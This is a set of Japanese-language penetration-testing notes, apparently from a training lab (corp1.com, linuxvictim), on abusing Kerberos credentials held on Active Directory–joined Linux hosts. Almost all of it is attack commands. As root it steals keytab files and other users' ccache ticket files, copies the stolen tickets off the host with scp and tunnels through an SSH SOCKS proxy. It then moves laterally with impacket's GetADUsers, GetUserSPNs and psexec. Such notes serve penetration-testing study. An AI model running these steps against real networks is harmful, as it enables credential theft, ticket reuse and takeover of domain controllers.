# 通常利用
AD認証情報を使用してSSH接続
```
ssh administrator@corp1.com@linuxvictim
```

認証情報キャッシュファイルのパス環境変数探索
```
env | grep KRB5CCNAME
```

TGT要求
```
kinit
```

チケット確認
```
klist
```

チケットで利用可能なSPNを列挙
```
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*" servicePrincipalName
```

サービスチケットの要求
```
kvno MSSQLSvc/DC01.corp1.com:1433
```

# キータブファイルの窃取
自動化されたスクリプトがユーザーに代わってKerberos対応ネットワークリソースにアクセスできるようにする方法の一つとして、 [_キータブ_](https://web.mit.edu/kerberos/krb5-devel/doc/basic/keytab_def.html) ファイルを使用する方法がある。

キータブファイルを使用したチケット取得
```
kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab
```

root権限になってkeytabファイルを探せばチケットを利用できる
# 認証情報キャッシュファイルを使用
ccacheファイルを探す
```
ls -al /tmp/krb5cc_*
```

ccacheファイルをコピーし、新しいファイルの所有者を自分に設定
```
sudo cp /tmp/krb5cc_~ /tmp/krb5cc_minenow
sudo chown offsec:offsec /tmp/krb5cc_minenow
```

古い認証情報をクリアして再読み込み
```
kdestroy
export KRB5CCNAME=/tmp/krb5cc_minenow
klist
```

# impacketでkerberos使用
ccacheファイルを持ってくる
```
scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
export KRB5CCNAME=/tmp/krb5cc_minenow
```


ユーティリティのインストール
```
sudo apt install krb5-user
```

/etc/hostsファイルにDCを追加
```
192.168.120.5 CORP1.COM DC01.CORP1.COM
```

proxychains.confファイル内の _proxy_dns_の行をコメントアウト
```
sudo vim /etc/proxychains4.conf
```

cache ファイルをコピーしたサーバー (この場合は linuxvictim) 上でsshを使用して SOCKS サーバーを設定する必要
```
ssh offsec@linuxvictim -D 9050
```

各種impacketで横展開可能
```
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5 CORP1.COM/Administrator
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.CORP1.COM -k -no-pass
```